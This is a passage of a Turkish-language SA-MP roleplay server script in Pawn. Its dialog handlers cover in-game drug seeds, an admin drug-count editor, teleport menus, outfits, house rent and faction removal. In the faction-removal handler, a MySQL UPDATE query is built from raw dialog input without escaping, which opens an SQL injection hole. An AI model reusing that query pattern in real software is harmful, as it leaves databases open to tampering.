		    SetPlayerAttachedObject(playerid, kindex[playerid], 2912, 1, 0.160999, 0.501999, -0.260000, 8.500000, 10.599993, -96.300041, 0.623000, 0.542000, 0.697999);
			Ipucu(playerid, "Kutu taþýyorsunuz, botunuza gidip kutuyu býrakabilirsiniz.");
		}
		return 1;
	}
	if(dialogid == 278)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
				case 0:
				{
				    if(Karakter[playerid][esrartohum] <= 0) return Hata(playerid, "Üzerinizde hiç esrar tohumu yok.");
				    SetPVarInt(playerid, "TohumEkiyor", listitem+1);
		    		Bilgi(playerid, "Tohum ekmek istediðiniz saksýyý seçin. Ýþlemi iptal etmek için ESC tuþunu kullanýn.");
					Ipucu(playerid, "Tekrar tohum ekmek için komutu tekrarlayýn.");
				    SelectObject(playerid);
				    SelectObjectTur[playerid] = 1;
				}
				case 1:
				{
				    return Hata(playerid, "Ýnaktif.");
				}
				case 2:
				{
				    return Hata(playerid, "Ýnaktif.");
				}
			}
		}
		return 1;
	}
	if(dialogid == 279)
	{
	    if(response)
		{
	        new _mid = strval(inputtext),mstring[128],mtext[16],pid=KDuzenleVar[playerid];
			switch(GetPVarInt(playerid,"UDegis"))
			{
			    case 1: Karakter[pid][uesrar] = _mid, mtext = "esrar";
			    case 2: Karakter[pid][esrartohum] = _mid, mtext = "esrar tohum";
			    case 3: Karakter[pid][amfetamin] = _mid, mtext = "amfetamin";
			    case 4: Karakter[pid][metamfetamin] = _mid, mtext = "metamfetamin";
			    case 5: Karakter[pid][lsd] = _mid, mtext = "lsd";
				case 6: Karakter[pid][extacy] = _mid, mtext = "extacy";
				case 7: Karakter[pid][eroin] = _mid, mtext = "eroin";
				case 8: Karakter[pid][kokain] = _mid, mtext = "kokain";
				case 9: Karakter[pid][morfin] = _mid, mtext = "morfin";
				case 10: Karakter[pid][MDA] = _mid, mtext = "MDA";
				case 11: Karakter[pid][erointohum] = _mid, mtext = "eroin tohum";
				case 12: Karakter[pid][kokaintohum] = _mid, mtext = "kokain tohum";
			}
	        format(mstring, 128, "%s adlý oyuncunun %s uyuþturucusunu %d olarak deðiþtirdiniz.",OyuncuAdiniBul(pid),mtext,_mid);
	        Bilgi(playerid, mstring);
	    }
	    return 1;
	}
	if(dialogid == 280)
	{
	    if(response)
	    {
	        SetPVarInt(playerid, "UDegis", listitem+1);
	    	ShowPlayerDialog(playerid, 279, DIALOG_STYLE_INPUT, "Uyuþturucu Deðiþtirme", "Deðiþtirmek istediðiniz uyuþturucu miktarýný giriniz:", "Tamam", "Geri");
	    }
	    else KDuzenleVar[playerid]=0;
		return 1;
	}
	if(dialogid == 281)
	{
	    if(response)
	    {
			switch(listitem)
        	{
        	    case 0:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 2138.3657, 34.0106, 26.4149);
					}
					else
					{
						SetPlayerPos(playerid, 2138.3657, 34.0106, 26.4149);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
        	    }
        	    case 1:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 1459.1672, -884.7161, 55.4190);
					}
					else
					{
						SetPlayerPos(playerid, 1459.1672, -884.7161, 55.4190);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
        	    }
        	    case 2:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 1468.8859, -1024.5707, 23.8281);
					}
					else
					{
						SetPlayerPos(playerid, 1468.8859, -1024.5707, 23.8281);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
        	    }
        	    case 3:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 2229.0630, -1160.6978, 25.7936);
					}
					else
					{
						SetPlayerPos(playerid, 2229.0630, -1160.6978, 25.7936);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
        	    }
        	    case 4:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 2751.9934, -2441.6226, 13.6484);
					}
					else
					{
						SetPlayerPos(playerid, 2751.9934, -2441.6226, 13.6484);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
        	    }
        	    case 5:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 1950.8688, -1773.5385, 13.5469);
					}
					else
					{
						SetPlayerPos(playerid, 1950.8688, -1773.5385, 13.5469);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
        	    }
        	    case 6:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 2106.5061, -1762.2140, 13.5625);
					}
					else
					{
						SetPlayerPos(playerid, 2106.5061, -1762.2140, 13.5625);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
        	    }
        	    case 7:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 1816.0975, -1683.0804, 13.5469);
					}
					else
					{
						SetPlayerPos(playerid, 1816.0975, -1683.0804, 13.5469);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
        	    }
        	    case 8:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 1814.2750, -1861.5599, 13.5781);
					}
					else
					{
						SetPlayerPos(playerid, 1814.2750, -1861.5599, 13.5781);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
        	    }
        	      case 9:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 1588.1644, -1320.4890, 17.5514);
					}
					else
					{
						SetPlayerPos(playerid, 1588.1644, -1320.4890, 17.5514);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
        	    }
        	      case 10:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 1787.4956, -1267.9083, 13.6328);
					}
					else
					{
						SetPlayerPos(playerid, 1787.4956, -1267.9083, 13.6328);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
        	    }
        	    case 11:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 1885.5969, -1393.5427, 13.5703);
					}
					else
					{
						SetPlayerPos(playerid, 1885.5969, -1393.5427, 13.5703);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
        	    }
        	    case 12:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 1963.5132, -1188.9913, 25.9591);
					}
					else
					{
						SetPlayerPos(playerid, 1963.5132, -1188.9913, 25.9591);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
        	    }
        	     case 13:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 1024.5244, -1135.1216, 23.8203);
					}
					else
					{
						SetPlayerPos(playerid, 1024.5244, -1135.1216, 23.8203);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
        	    }
        	    case 14:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 1127.7650, -1389.5795, 13.7038);
					}
					else
					{
						SetPlayerPos(playerid, 1127.7650, -1389.5795, 13.7038);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
        	    }
        	    case 15:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 1181.8373, -1323.5006, 13.5821);
					}
					else
					{
						SetPlayerPos(playerid, 1181.8373, -1323.5006, 13.5821);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
        	    }
        	    case 16:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 307.9643, -1203.9834, 75.8801);
					}
					else
					{
						SetPlayerPos(playerid, 307.9643, -1203.9834, 75.8801);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
        	    }
        	    case 17:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 1742.5183, 533.4815, 27.2401);
					}
					else
					{
						SetPlayerPos(playerid, 1742.5183, 533.4815, 27.2401);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
        	    }
        	    case 18:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 2767.1379, 476.6946, 8.2898);
					}
					else
					{
						SetPlayerPos(playerid, 2767.1379, 476.6946, 8.2898);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
				}
        	    case 19:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 2422.336425, -1232.715820, 24.643161);
					}
					else
					{
						SetPlayerPos(playerid, 2422.336425, -1232.715820, 24.643161);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
				}
        	    case 20:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 2857.309326, -1607.118408, 11.093750);
					}
					else
					{
						SetPlayerPos(playerid, 2857.309326, -1607.118408, 11.093750);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
				}
        	    case 21:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 1734.250610, -2281.854980, 13.375518);
					}
					else
					{
						SetPlayerPos(playerid, 1734.250610, -2281.854980, 13.375518);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
				}
        	    case 22:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 1728.666259, -2292.005371, -2.851562);
					}
					else
					{
						SetPlayerPos(playerid, 1728.666259, -2292.005371, -2.851562);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
				}
        	    case 23:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 241.357925, -1847.455932, 3.302210);
					}
					else
					{
						SetPlayerPos(playerid, 241.357925, -1847.455932, 3.302210);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
				}
        	    case 24:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 241.357925, -1847.455932, 3.302210);
					}
					else
					{
						SetPlayerPos(playerid, 241.357925, -1847.455932, 3.302210);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
				}
        	    case 25:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 241.357925, -1847.455932, 3.302210);
					}
					else
					{
						SetPlayerPos(playerid, 241.357925, -1847.455932, 3.302210);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
				}
        	    case 26:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 241.357925, -1847.455932, 3.302210);
					}
					else
					{
						SetPlayerPos(playerid, 241.357925, -1847.455932, 3.302210);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
				}
        	    case 27:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 549.265136, -1279.612304, 17.248237);
					}
					else
					{
						SetPlayerPos(playerid, 549.265136, -1279.612304, 17.248237);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
				}
        	    case 28:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 940.412414, -1404.033203, 13.282015);
					}
					else
					{
						SetPlayerPos(playerid, 940.412414, -1404.033203, 13.282015);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
				}
        	    case 29:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 917.732421, -1221.486083, 16.976562);
					}
					else
					{
						SetPlayerPos(playerid, 917.732421, -1221.486083, 16.976562);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
				}
        	    case 30:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 767.697692, -1345.630249, 13.520334);
					}
					else
					{
						SetPlayerPos(playerid, 767.697692, -1345.630249, 13.520334);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
				}
        	    case 31:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 2244.419189, -1663.573486, 15.476562);
					}
					else
					{
						SetPlayerPos(playerid, 2244.419189, -1663.573486, 15.476562);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
				}
        	    case 32:
        	    {
            		if(GetPlayerState(playerid) == 2)
					{
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 2487.8384, -1661.7947, 13.3359);
					}
					else
					{
						SetPlayerPos(playerid, 2487.8384, -1661.7947, 13.3359);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerInterior(playerid, 0);
					}
				}
	  		}
		}
		return 1;
	}
	if(dialogid == 282)
	{
	    if(response)
	    {
    		new __bol[5][6], mstring[128];
			strexplode(__bol, Karakter[playerid][kiyafetler], "|");
			if(strval(__bol[listitem]) == 0) return Hata(playerid, "Bu slotunuzda bir kýyafet yok.");
			SetPlayerSkin(playerid, strval(__bol[listitem]));
			Karakter[playerid][skin] = strval(__bol[listitem]);
			format(mstring, sizeof(mstring), "Baþarýyla %d. slotunuzdaki kýyafeti giydiniz.", listitem+1);
			Bilgi(playerid, mstring);
		}
	    return 1;
	}
	if(dialogid == 283)
	{
		if(response)
		{
		    new __bol2[5][6], mstring[128];
			strexplode(__bol2, Karakter[playerid][kiyafetler], "|");
			new _skin=GetPVarInt(playerid, "SlotSeciyor");
			DeletePVar(playerid, "SlotSeciyor");
		    format(mstring, sizeof(mstring), "Baþarýyla %s(%d) kýyafetini %d slotuna yerleþtirdiniz.",GetSkinModelNameEx(_skin),_skin,listitem+1);
		    Bilgi(playerid, mstring);
		    Ipucu(playerid, "/kiyafetlerim komutunu kullanarak evde veya iþyerinde kýyafetinizi deðiþtirebilirsiniz.");
		    format(__bol2[listitem], 6, "%d", _skin);
			new __1=strval(__bol2[0]), __2=strval(__bol2[1]), __3=strval(__bol2[2]), __4=strval(__bol2[3]), __5=strval(__bol2[4]);
		    format(Karakter[playerid][kiyafetler], 64, "%d|%d|%d|%d|%d",__1,__2,__3,__4,__5);
			//printf("%s (%d|%d|%d|%d|%d)",Karakter[playerid][kiyafetler],strval(__bol2[0]),strval(__bol2[1]),strval(__bol2[2]),strval(__bol2[3]),strval(__bol2[4]));
		    KarakterKaydet(playerid);
		}
		return 1;
	}
	if(dialogid == 284)
	{
		new yakindaki = EvMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Ev[yakindaki][kira] = isyz;
			EvKaydet(yakindaki);
			format(string, sizeof(string), "Ev bilgileri ve log dosyasý kaydedildi! Yeni ev kira durumunu: %d olarak degistirildi.", isyz);
			Bilgi(playerid, string);
		}
		ShowEDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 285)
	{
		new yakindaki = EvMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Ev[yakindaki][kiralayan] = isyz;
			EvKaydet(yakindaki);
			format(string, sizeof(string), "Ev bilgileri ve log dosyasý kaydedildi! Yeni ev kiralayaný: %d(%s) olarak degistirildi.", isyz, SQLFromName(isyz));
			Bilgi(playerid, string);
		}
		ShowEDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 286)
	{
		new yakindaki = EvMesafesi(2.0, playerid);
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
			new isyz = strval(inputtext);
			new string[128];
			if(yakindaki == 0)
			{
			    return 1;
			}
			Ev[yakindaki][kirafiyat] = isyz;
			EvKaydet(yakindaki);
			format(string, sizeof(string), "Ev bilgileri ve log dosyasý kaydedildi! Yeni ev kira fiyatý: %d$ olarak degistirildi.", isyz);
			Bilgi(playerid, string);
		}
		ShowEDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 287)
	{
	    	if(response)
			{
				switch(listitem)
		        {

		           		case 0:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 1564.6164, -1664.9943, 28.5460);
							SetPlayerInterior(playerid, 0);
				         	SetPlayerVirtualWorld(playerid, 0);
			            }
			            case 1:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, -1721.9769, -1543.2437, 1308.8221);
							SetPlayerInterior(playerid, 1);
				         	SetPlayerVirtualWorld(playerid, 1);
			            }
			            case 2:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 398.1203, -131.5005, 1020.5906);
							SetPlayerInterior(playerid, 1);
				         	SetPlayerVirtualWorld(playerid, 1);
			            }
			            case 3:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, -1302.2266, 2431.9607, 3501.4861);
							SetPlayerInterior(playerid, 1);
				         	SetPlayerVirtualWorld(playerid, 1);
			            }
			            case 4:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 3603.4602, -542.6646, 943.7070);
							SetPlayerInterior(playerid, 1);
				         	SetPlayerVirtualWorld(playerid, 1);
			            }
			            case 5:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 601.8992, -2272.9316, 886.1508);
							SetPlayerInterior(playerid, 1);
				         	SetPlayerVirtualWorld(playerid, 1);
			            }
			            case 6:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 371.8300, 27.0650, 1011.5668);
							SetPlayerInterior(playerid, 1);
				         	SetPlayerVirtualWorld(playerid, 1);
			            }case 7:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, -728.5673, -2957.8349, 1197.7346);
							SetPlayerInterior(playerid, 1);
				         	SetPlayerVirtualWorld(playerid, 1);
			            }
			            case 8:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 1579.9252, -1637.0314, 13.5520);
							SetPlayerInterior(playerid, 0);
				         	SetPlayerVirtualWorld(playerid, 0);
			            }
			            case 9:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 1568.5881, -1690.2446, 5.8906);
							SetPlayerInterior(playerid, 0);
				         	SetPlayerVirtualWorld(playerid, 0);
			            }
			            case 10:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 2182.8093, -958.1903, 1071.0654);
							SetPlayerInterior(playerid, 1);
				         	SetPlayerVirtualWorld(playerid, 1);
			            }
			            case 11:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 4792.2128, 1276.0113, 2.0049);
							SetPlayerInterior(playerid, 0);
				         	SetPlayerVirtualWorld(playerid, 11);
			            }
					}
				}
	}
	if(dialogid == 645)
	{
	    	if(response)
			{
				switch(listitem)
		        {

		           		case 0:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 181.0838,959.3849,934.8640);
							SetPlayerInterior(playerid, 1);
				         	SetPlayerVirtualWorld(playerid, 471);
			            }
			            case 1:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, -328.841857,886.876770,1145.136840);
							SetPlayerInterior(playerid, 1);
				         	SetPlayerVirtualWorld(playerid, 1);
			            }
			            case 2:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 507.553283,1898.198242,806.363891);
							SetPlayerInterior(playerid, 1);
				         	SetPlayerVirtualWorld(playerid, 1);
			            }
			            case 3:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 507.792144,1934.146972,816.185729);
							SetPlayerInterior(playerid, 2);
				         	SetPlayerVirtualWorld(playerid, 2);
			            }
						case 4:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 507.521362,1969.376098,822.405700);
							SetPlayerInterior(playerid, 1);
				         	SetPlayerVirtualWorld(playerid, 1);
			            }
						case 5:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 548.167358,1969.330810,822.425720);
							SetPlayerInterior(playerid, 2);
				         	SetPlayerVirtualWorld(playerid, 2);
			            }
			            case 6:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, -380.070129,964.140625,1170.181640);
							SetPlayerInterior(playerid, 1);
				         	SetPlayerVirtualWorld(playerid, 1);
			            }
			            case 7:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 937.268615,221.167663,858.126159);
							SetPlayerInterior(playerid, 1);
				         	SetPlayerVirtualWorld(playerid, 1);
			            }
			            case 8:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, -609.147399,428.328338,1499.911132);
							SetPlayerInterior(playerid, 1);
				         	SetPlayerVirtualWorld(playerid, 1);
			            }
			            case 9:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, -890.693847,780.902038,1422.468505);
							SetPlayerInterior(playerid, 1);
				         	SetPlayerVirtualWorld(playerid, 1);
			            }
			            case 10:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, -380.018554,883.632141,1158.043579);
							SetPlayerInterior(playerid, 1);
				         	SetPlayerVirtualWorld(playerid, 1);
			            }
			            case 11:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 866.298767,174.518722,897.927062);
							SetPlayerInterior(playerid, 1);
				         	SetPlayerVirtualWorld(playerid, 1);
			            }
						case 12:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 300.7304,-1528.6063,24.9229);
							SetPlayerInterior(playerid, 1);
				         	SetPlayerVirtualWorld(playerid, 3);
			            }
					}
				}
	}
	if(dialogid == 646)
	{
	    	if(response)
			{
				switch(listitem)
		        {

		           		case 0:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 1270.8773,-1245.4722,13.6414);
							SetPlayerInterior(playerid, 0);
				         	SetPlayerVirtualWorld(playerid, 0);
			            }
			            case 1:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 1272.4161,-1245.5004,19.2145);
							SetPlayerInterior(playerid, 0);
				         	SetPlayerVirtualWorld(playerid, 0);
			            }
			            case 2:  //
			            {
							SetTimerEx("UnfreezeTimer", 2500, false, "i", playerid);
   							TogglePlayerControllable(playerid, 0);
							SetPlayerPos(playerid, 1235.2213,-1236.7312,25.8706);
							SetPlayerInterior(playerid, 0);
				         	SetPlayerVirtualWorld(playerid, 0);
			            }
					}
				}
	}
 	if(dialogid == 288)
	{
	    if(response)
	    {
	        if(!BirlikYetkili(playerid) && Karakter[playerid][sqlid] != Birlik[Karakter[playerid][birlik]][blider]) return FactMenu(playerid);
			new _name[MAX_PLAYER_NAME+2];
			new mstring[128];
			format(_name, sizeof(_name), "%s",inputtext);
            foreach(new i : Player)
			{
			    if(Buysa(Isim(i),_name))
			    {
					if(Karakter[i][birlik] != Karakter[playerid][birlik]) return Hata(playerid, "Oyuncu sizin birliðinizde bulunmamaktadýr.");
			        if(Karakter[birlik][rutbe] >= Karakter[i][rutbe]) return Hata(playerid, "Bu oyuncuyu birliðinizden çýkartamazsýnýz.");
			        Karakter[i][birlik] = 0;
			        Karakter[i][rutbe] = 0;
			        //strreplace(_name, "_", " ");
			        SendClientMessageEx(playerid, -1, ""C2"[BÝRLÝK] "C1"%s adlý oyuncuyu %s adlý birlikten çýkardýnýz.",_name, Birlik[Karakter[playerid][birlik]][fisim]);
			        format(mstring, sizeof(mstring), "%s isimli oyuncu birlikten atýldý.",_name);
			    	if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD) LSPDGonder(mstring);
			    	else BirlikGonder(playerid,mstring);
			        return 1;
			    }
			}
			new _id = BirlikKontrol(_name, playerid);
			if(_id == 1)
			{
				new query[128];
				format(query, sizeof(query), "UPDATE `karakterler` SET `birlik` = '0' WHERE `isim` = '%s'",_name);
				mysql_tquery(1, query);
				SendClientMessageEx(playerid, -1, ""C2"[BÝRLÝK] "C1"%s adlý oyuncuyu %s adlý birlikten çýkardýnýz.", _name, Birlik[Karakter[playerid][birlik]][fisim]);
				format(mstring, sizeof(mstring), "%s isimli oyuncu birlikten atýldý.",_name);
       			if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD) LSPDGonder(mstring);
       			else BirlikGonder(playerid,mstring);
			}
			else if(_id == 2) return Hata(playerid, "Bu oyuncuyu birliðinizden çýkartamazsýnýz.");
			else if(_id == 3) return Hata(playerid, "Oyuncu sizin birliðinizde bulunmamaktadýr.");
			else if(_id == 4) return Hata(playerid, "Bu isimde bir oyuncu bulunmamaktadýr.");
	    }
	    return 1;
	}
	if(dialogid == 289)
	{
	    if(response)
	    {
	        new _osay=0, mstring[256];
	        for(new i;i<MAX_PLAYERS;i++)
	        {
	            if(Karakter[i][Rapor] == 1)
	            {
		            _osay++;
		            if(_osay == listitem+1)
		            {
				        format(mstring, sizeof(mstring), ""C2"%s["C1"%d"C2"]\n"C2"( "C1"%s "C2")",OyuncuAdiniBul(i),i,Karakter[i][RaporMesaj]);
				        SetPVarInt(playerid, "RaporCevapla", i);
				        break;
					}
				}
			}
